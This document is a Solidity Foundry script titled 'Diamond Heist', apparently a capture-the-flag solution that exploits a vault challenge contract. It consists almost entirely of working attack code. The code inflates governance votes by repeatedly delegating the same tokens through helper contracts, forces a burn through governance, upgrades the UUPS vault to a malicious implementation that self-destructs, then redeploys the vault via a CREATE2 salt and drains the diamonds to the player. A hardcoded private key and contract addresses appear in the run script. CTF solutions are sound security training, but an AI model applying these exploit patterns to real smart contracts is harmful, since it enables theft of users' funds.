# Diamond Heist

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import "./openzeppelin-contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
    function delegate(address delegatee) external;
}

interface IVault {
    function governanceCall(bytes calldata data) external;
    function burn(address token, uint amount) external;
    function pwn1() external;
    function pwn2(IChallenge chal) external;
    function initialize(address diamond_, address hexensCoin_) external;
}

interface IVaultFactory {
    function createVault(bytes32 salt_) external returns (IVault);
}

interface IChallenge {
    function PLAYER() external returns (address);
    function claim() external;
    function vaultFactory() external returns (IVaultFactory);
    function vault() external returns (IVault);
    function diamond() external returns (IERC20);
    function hexensCoin() external returns (IERC20);
}

contract Exploit2 {
    IChallenge public chal;
    constructor(IChallenge _chal) {
        chal = _chal;
    }

    function pwn() external {
        IERC20 coin = chal.hexensCoin();
        coin.delegate(msg.sender);
        coin.transfer(msg.sender, 10_000 ether);
    }
}

contract MyBurner {
    function pwn(IChallenge chal) external {
        chal.diamond().transfer(chal.PLAYER(), 31337);
    }
}

contract MyVaultImpl is UUPSUpgradeable {
    function _authorizeUpgrade(address) internal override view {}

    function pwn1() external {
        selfdestruct(payable(address(this)));
    }

    function pwn2(IChallenge chal) external {
        MyBurner b = new MyBurner();
        b.pwn(chal);
    }
}

contract Exploit {
    IChallenge public chal;
    MyVaultImpl v;
    constructor(IChallenge _chal) {
        chal = _chal;
        v = new MyVaultImpl();
    }

    function pwn1() external {
        IVault vault = chal.vault();
        IERC20 coin = chal.hexensCoin();

        chal.claim();

        for (uint i = 0; i < 10; i++) {
            Exploit2 e = new Exploit2(chal);
            coin.transfer(address(e), 10_000 ether);
            e.pwn();
        }

        vault.governanceCall(abi.encodeWithSelector(
            IVault.burn.selector,
            address(chal.diamond()),
            31337
        ));

        vault.governanceCall(abi.encodeWithSelector(
            UUPSUpgradeable.upgradeTo.selector,
            address(v)
        ));
        vault.pwn1();

        // vault destoryed
    }

    function pwn2() external {
        IVault vault = chal.vault();

        chal.vaultFactory().createVault(keccak256("The tea in Nepal is very hot. But the coffee in Peru is much hotter."));
        vault.initialize(address(chal.hexensCoin()), address(0));
        vault.governanceCall(abi.encodeWithSelector(
            UUPSUpgradeable.upgradeTo.selector,
            address(v)
        ));
        vault.pwn2(chal);
    }
}

contract CounterScript is Script {
    uint256 public privateKey = 0xc319123755e8d1e1150e2594d8e1384aa0a5bab4699f6c8ba953f7b5486c5312;
    IChallenge public chal = IChallenge(0x863dD74dD32f70190e7711db7C1719ecF27b456b);

    function setUp() public {}

    function run() public {
        // vm.startBroadcast(privateKey);
        // Exploit e = new Exploit(chal);
        // e.pwn1();
        // vm.stopBroadcast();

        Exploit e = Exploit(0x18e2BAb05E25fe444Ca2EE09031faFF1FcfFee35);
        vm.startBroadcast(privateKey);
        e.pwn2();
        vm.stopBroadcast();
    }
}
```
